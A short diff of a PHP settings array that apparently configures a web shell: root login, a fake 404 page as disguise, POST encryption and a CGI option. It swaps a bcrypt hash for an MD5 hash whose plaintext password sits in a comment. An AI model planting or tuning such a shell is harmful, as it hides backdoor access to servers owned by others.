@@ -1,11 +1,11 @@
 <?php
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'root',
-    'password' => '$2y$10$ZqolOSVQhCMC0z17goDZrevgyeQv14e4csJeQWU.0Y1Xo8p39tJr6',
-    'safe_mode' => '0',
-    'login_page' => '403',
+    'password' => '16a3c13e69b9bfb59b4ad5a147c5f70e',//md5(ehsan)
+    'safe_mode' => '1',
+    'login_page' => '404',
     'show_icons' => '1',
-    'post_encryption' => false,
+    'post_encryption' => true,
     'cgi_api' => true,
 );
 
